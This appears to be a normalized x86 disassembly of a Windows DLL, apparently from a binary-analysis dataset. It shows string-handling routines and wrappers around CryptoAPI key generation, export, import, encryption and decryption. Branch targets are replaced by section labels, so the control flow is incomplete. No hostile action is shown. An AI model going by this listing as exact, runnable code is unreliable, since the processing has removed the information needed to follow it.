push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
mov edx esi
push edi
lea edi [ edx + 0x1 ]
xor edx edx
push edx
push esi
call sub_10005470
pop esi
pop ebp
retn 0x4
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx edi
pop edi
push edx
push esi
call sub_10005470
pop esi
pop ebp
retn 0x4
sub_10005470
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub eax ecx
mov [ ebp + 0x8 ] ecx
cmp eax ebx
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
push r--data
call sub_1003c5be
test ebx ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea eax [ ecx + ebx ]
mov ecx esi
push 0x0
push eax
call sub_10001bb0
test al al
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp edi eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
add eax edx
cmp eax edi
jbe r-xdata
mov ecx [ ebp + 0x8 ]
add ecx ebx
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
mov eax [ esi + 0x10 ]
push ebx
add eax ecx
push edi
push eax
call sub_1003dc80
add esp 0xc
test ebx ebx
je r-xdata
push [ ebp + 0xc ]
mov eax esi
mov ecx esi
sub edi eax
push edi
push esi
call sub_100050b0
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov eax [ esi ]
mov ecx esi
sub edi eax
push edi
push esi
call sub_100050b0
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
mov [ eax + ecx ] 0x0
mov eax [ esi ]
pop ebx
pop edi
mov [ eax + ecx ] 0x0
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10005580
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bc88
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_10004530
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100055e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bc13
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x90
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp [ edi + 0x58 ] 0x1
sete cl
push ecx
sub esp 0x3c
mov ecx edi
mov eax esp
mov [ ebp - 0x14 ] esp
push eax
call sub_10004670
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_100261b0
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10005690
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bd31
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x58 ] 0x0
cmp [ rw-data ] 0x0
mov edi [ InterlockedExchange@IAT ]
mov [ ebp - 0x5c ] esi
jne r-xdata
mov ebx [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0xf
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x50 ] eax
jne r-xdata
mov ecx 0xd
call sub_100382c0
push eax
push rw-data
call edi
mov edi [ rw-data ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
mov ecx 0xe
call sub_100382c0
push eax
push rw-data
call edi
mov ecx ebx
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
mov ecx esi
call sub_100019e0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp - 0x54 ]
mov [ ebp - 0x58 ] 0x1
cmp [ ebx + 0x58 ] 0x1
cmove edi [ ebp - 0x50 ]
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
mov ecx esi
call sub_10005470
lea eax [ ebp - 0x4c ]
mov ecx ebx
push eax
call sub_10004670
mov [ ebp - 0x4 ] 0x1
mov ecx esi
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x4c ]
call sub_100047b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
sub_10005800
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bd96
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x1
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x2
mov [ edi ] r--data
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x4
xor eax eax
mov [ edi ] r--data
mov [ edi + 0x30 ] 0x7
mov [ edi + 0x2c ] 0x0
mov [ edi + 0x1c ] ax
mov [ ebp - 0x4 ] 0x5
mov ebx [ InterlockedExchange@IAT ]
cmp [ rw-data ] eax
jne r-xdata
mov edx [ rw-data ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x10 ] edx
jne r-xdata
xor ecx ecx
call sub_100383b0
push eax
push rw-data
call ebx
mov ebx [ rw-data ]
cmp [ edi + 0x30 ] 0x8
mov [ edi + 0x2c ] 0x0
jb r-xdata
mov ecx 0x1
call sub_100383b0
push eax
push rw-data
call ebx
mov edx [ ebp - 0x10 ]
lea eax [ edi + 0x1c ]
mov eax [ edi + 0x1c ]
jmp r-xdata
push ecx
push edx
lea ecx [ edi + 0x1c ]
call sub_10005dc0
push 0xffffffff
push 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ edi + 0x1c ]
call sub_10005cf0
cmp [ ebx ] 0x0
jne r-xdata
mov ecx edx
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x10 ] eax
lea esp [ esp ]
xor ecx ecx
mov [ eax ] cx
cmp [ edx ] cx
je r-xdata
mov ecx ebx
lea edx [ ecx + 0x2 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx [ ebp - 0x10 ]
sar ecx 0x1
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
push ebx
lea ecx [ edi + 0x1c ]
call sub_10005dc0
push 0xffffffff
push 0x0
lea eax [ ebp + 0x20 ]
push eax
lea ecx [ edi + 0x1c ]
call sub_10005cf0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x34 ] 0x8
jb r-xdata
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x34 ] 0x7
mov [ ebp + 0x20 ] ax
mov eax edi
mov [ ebp + 0x30 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x30
push [ ebp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100059d0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10005a00
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10005a00
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bde6
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x30 ] 0x8
jb r-xdata
xor eax eax
mov [ esi + 0x30 ] 0x7
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] ax
mov [ ebp - 0x4 ] 0x2
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push [ esi + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10005ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004be39
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x2c ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x30 ] esi
jne r-xdata
mov edx [ rw-data ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ edx ] 0x0
mov [ ebp - 0x2c ] 0x1
jne r-xdata
mov ecx 0x10
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov ecx edx
lea edi [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
push ecx
push edx
mov ecx esi
call sub_10005470
sub esp 0x18
xor eax eax
mov ecx esp
mov [ ebp - 0x34 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebx + 0x1c ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_1003c1b0
add esp 0x18
mov [ ebp - 0x4 ] 0x2
mov ecx esi
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov eax esi
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10005bf0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004be73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x24
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub esp 0x18
xor eax eax
mov ecx esp
mov [ ebp - 0x14 ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ edi + 0x1c ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_10026e60
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10005ca0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp [ edx ] 0x0
jne r-xdata
mov eax edx
push edi
lea edi [ eax + 0x2 ]
xor eax eax
push eax
push edx
call sub_10005dc0
pop esi
pop ebp
retn 0x4
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
mov ecx esi
pop edi
sar eax 0x1
push eax
push edx
call sub_10005dc0
pop esi
pop ebp
retn 0x4
sub_10005cf0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0xc ]
mov eax [ edi + 0x10 ]
cmp eax ecx
jb r-xdata
push r--data
call sub_1003c5ec
mov ebx [ ebp + 0x10 ]
sub eax ecx
mov ecx [ esi + 0x10 ]
cmp eax ebx
mov [ ebp + 0x8 ] ecx
cmovb ebx eax
or eax 0xffffffff
sub eax ecx
cmp eax ebx
jbe r-xdata
push r--data
call sub_1003c5be
test ebx ebx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
lea eax [ ecx + ebx ]
push ecx
push eax
mov ecx esi
call sub_10003d30
test al al
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edi [ edi ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx ebx
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ecx
jb r-xdata
lea eax [ ebx + ebx ]
push eax
mov eax [ ebp + 0xc ]
lea eax [ edi + eax * 2 ]
push eax
mov eax [ esi + 0x10 ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_1003dc80
add esp 0xc
test ebx ebx
je r-xdata
mov eax esi
xor edx edx
mov [ eax + ecx * 2 ] dx
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax + ecx * 2 ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
sub_10005dc0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub eax ecx
mov [ ebp + 0x8 ] ecx
cmp eax ebx
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
push r--data
call sub_1003c5be
test ebx ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea eax [ ecx + ebx ]
push ecx
push eax
mov ecx esi
call sub_10003d30
test al al
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp edi eax
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp ecx 0x8
jb r-xdata
mov eax [ esi + 0x10 ]
lea eax [ edx + eax * 2 ]
cmp eax edi
jbe r-xdata
mov ecx [ ebp + 0x8 ]
add ecx ebx
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ecx
jb r-xdata
lea eax [ ebx + ebx ]
push eax
mov eax [ esi + 0x10 ]
push edi
lea eax [ ecx + eax * 2 ]
push eax
call sub_1003dc80
add esp 0xc
test ebx ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ eax + ecx * 2 ] dx
mov eax [ esi ]
xor edx edx
pop ebx
pop edi
mov [ eax + ecx * 2 ] dx
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
mov ecx esi
sar edi 0x1
push edi
push esi
call sub_10005cf0
pop edi
pop esi
pop ebp
retn 0x8
sub_10005eb0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10005ee0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004be98
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call [ CryptDestroyKey@IAT ]
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
mov [ esi + 0xc ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10005f80
push ebp
mov ebp esp
push 0xffffffff
push sub_1004be98
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call [ CryptDestroyKey@IAT ]
mov [ esi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
mov [ esi + 0xc ] 0x0
sub_10006000
push esi
push edi
mov esi ecx
push 0xf0000040
push [ esi + 0x4 ]
lea edi [ esi + 0xc ]
push 0x0
push 0x0
push edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
push 0xf0000048
push [ esi + 0x4 ]
push 0x0
push 0x0
push edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
sub_10006050
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bee1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x34 ]
push eax
push 0x1
mov [ ebp - 0x2c ] 0x0
push [ ecx + 0x8 ]
mov [ ebp - 0x38 ] esi
push [ ecx + 0xc ]
call [ CryptGenKey@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x30 ] 0x0
push eax
push 0x0
push 0x0
push 0x8
push 0x0
push [ ebp - 0x34 ]
call [ CryptExportKey@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
jmp r-xdata
call [ GetLastError@IAT ]
mov eax [ ebp - 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x2c ] 0x1
push eax
call sub_1003c61a
add esp 0x4
mov edi eax
lea eax [ ebp - 0x30 ]
push eax
push edi
push 0x0
push 0x8
push 0x0
push [ ebp - 0x34 ]
call [ CryptExportKey@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x30 ] 0xc
jb r-xdata
push edi
call j_sub_1003f3e3
add esp 0x4
jmp r-xdata
push [ ebp - 0x34 ]
call [ CryptDestroyKey@IAT ]
cmp [ edi ] 0x8
mov ecx [ edi + 0x8 ]
jne r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea eax [ ecx + 0xc ]
cmp eax [ ebp - 0x30 ]
ja r-xdata
push ecx
lea eax [ edi + 0xc ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10006630
mov [ ebp - 0x4 ] 0x1
push edi
call j_sub_1003f3e3
add esp 0x4
lea eax [ ebp - 0x28 ]
mov ecx esi
push eax
call sub_10004f60
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_10001880
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
sub_100061b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bf20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x10 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x28 ]
mov eax [ edi + 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x30 ]
push 0x8
push eax
mov [ ebp - 0x30 ] 0x208
call sub_10005470
push 0x4
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_10005470
push 0xffffffff
push 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_100050b0
cmp [ ebp - 0x14 ] 0x10
lea eax [ ebp - 0x28 ]
push esi
cmovae eax [ ebp - 0x28 ]
push 0x0
push 0x0
push [ ebp - 0x18 ]
push eax
push [ edi + 0xc ]
call [ CryptImportKey@IAT ]
cmp eax 0x1
je r-xdata
push eax
call [ CryptDestroyKey@IAT ]
mov [ esi ] 0x0
mov esi 0x1
call [ GetLastError@IAT ]
xor esi esi
jmp r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10006300
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bf79
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov [ ebp - 0x34 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x30 ] eax
lea esi [ eax * 4 + 0x1000 ]
push esi
call sub_1003c61a
cmp [ ebp + 0x20 ] 0x10
lea ecx [ ebp + 0xc ]
push [ ebp + 0x1c ]
cmovae ecx [ ebp + 0xc ]
mov ebx eax
push ecx
push ebx
call sub_1003dc80
add esp 0x10
lea eax [ ebp - 0x30 ]
push esi
push eax
mov eax [ ebp - 0x34 ]
push ebx
push [ eax + 0x14 ]
push [ ebp + 0x24 ]
push 0x0
push [ eax + 0x10 ]
call [ CryptEncrypt@IAT ]
test eax eax
jne r-xdata
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
push [ ebp - 0x30 ]
mov [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x0
push ebx
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x2
push ebx
call j_sub_1003f3e3
add esp 0x4
lea eax [ ebp - 0x28 ]
mov ecx edi
push eax
call sub_10004f60
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
call [ GetLastError@IAT ]
push ebx
call j_sub_1003f3e3
mov [ edi + 0x14 ] 0xf
add esp 0x4
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x20 ] 0x10
jb r-xdata
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp + 0x20 ] 0xf
mov [ ebp + 0x1c ] 0x0
mov [ ebp + 0xc ] 0x0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x20
push [ ebp + 0xc ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100064a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bfc9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x30 ] eax
lea ecx [ eax * 4 ]
push ecx
call sub_1003c61a
cmp [ ebp + 0x20 ] 0x10
lea ecx [ ebp + 0xc ]
push [ ebp + 0x1c ]
cmovae ecx [ ebp + 0xc ]
mov edi eax
push ecx
push edi
call sub_1003dc80
add esp 0x10
lea eax [ ebp - 0x30 ]
push eax
push edi
push [ ebx + 0x18 ]
push [ ebp + 0x24 ]
push 0x0
push [ ebx + 0x10 ]
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
